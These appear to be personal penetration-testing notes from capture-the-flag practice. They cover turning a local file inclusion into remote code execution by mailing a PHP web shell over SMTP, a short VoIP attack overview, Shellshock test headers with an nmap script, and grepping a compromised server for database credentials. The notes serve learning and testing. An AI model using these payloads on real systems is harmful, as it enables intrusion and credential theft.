Will organize things along the way 😌

When port 25 is open, and we have found an LFI on the server, then we can perform LFI2RCE through SMPT Log Poisoning. There are two ways (as far as I know) to do it. I'm going to
cover the one I have experience with.

First, read /etc/passwd through LFI and get interesting users. Then, connect to SMTP with

```
telnet <ip address> 25 (nc should work too)
```
Verify the users like so:
```
VRFY $user@localhost
```
If we get back

252 2.0.0 $user@localhost

Then we are good and we can syntax the malicious mail
```
mail from: temp
rcpt to: $user@localhost
data
Subject: Bruh
<?php echo system($_REQUEST['cmd']); ?>
.
```
Then we can go ahead and close our connection with ```quit```. Now, this mail is stored in the user's /var/mail file. Since we added a valid php script in the mail, it was passed
into the file, and we can freely use the cmd parameter to execute commands in the system and have it echo them back to us. Now we can pass e.g. a reverse shell.

References:
https://janithmalinga.github.io/redteam/ctf/2020/02/12/Using-LFI-and-SMTP-to-get-a-Shell.html
https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/ (the other way is specified here)
https://www.youtube.com/watch?v=XJmBpOd__N8

-------------------------------------------------------------------------

Beep from HTB had a possible RCE exploit which was based on VoIP. For now I don't know the whole concept, but I think I understand a general way of attacking VoIP. Essentially,
devices in a network are given an extension, i.e. a number by which they can be identified by the PBX server. So we try to find the extensions that are open, and attack them. In
a real-life scenario we probably intercept the traffic during the authentication phase and dump the creds, in boxes not really 😩 (unless bots exist)
https://www.exploit-db.com/docs/english/18136-paper-enumerating-and-breaking-voip.pdf


I'm gonna let this nicely written piece of text do the explanation for me
```
When a web server uses the Common Gateway Interface (CGI) to handle a document request, it passes various details of the request to a handler program in the environment variable list. For example, the variable HTTP_USER_AGENT has a value that, in normal usage, identifies the program sending the request. If the request handler is a Bash script, or if it executes one for example using the system(3) call, Bash will receive the environment variables passed by the server and will process them as described above. This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted server request. Security documentation for the widely used Apache web server states: "CGI scripts can ... be extremely dangerous if they are not carefully checked." and other methods of handling web server requests are often used. There are a number of online services which attempt to test the vulnerability against web servers exposed to the Internet.
```
TLDR if cgi-bin exists, then a possible entry point is shellshock. We can try testing for this manually by changing the headers to ```() { :;}; echo; echo 1```
Notice the second echo. It might be necessary for the exploit to work and write out the proper output. Another way we can check is though the nmap script engine
```
nmap -sV -p<ports> --script http-shellshock --script-args uri=<path>,cmd=ls <target>
```
Some PointsOfInformation. It may be necessary to execute a script by calling its absolute path

```
() {:;}; echo; /bin/ls
```

References:
https://nmap.org/nsedoc/scripts/http-shellshock.html
https://en.wikipedia.org/wiki/Shellshock_(software_bug)
https://github.com/opsxcq/exploit-CVE-2014-6271
https://www.youtube.com/watch?v=IBlTdguhgfY


------------------------------------------------------------

If we gain access to a webserver (I'd say this applies more to low priv
access), and the machine is running PHP and a database, then we can search
for credentials to connect to said database. We could try something like:
```
grep -r <pattern-here> ./*
```
For the pattern we can use words like password, database, username, and once
we find an interesting one, we can search the file from which it came from.
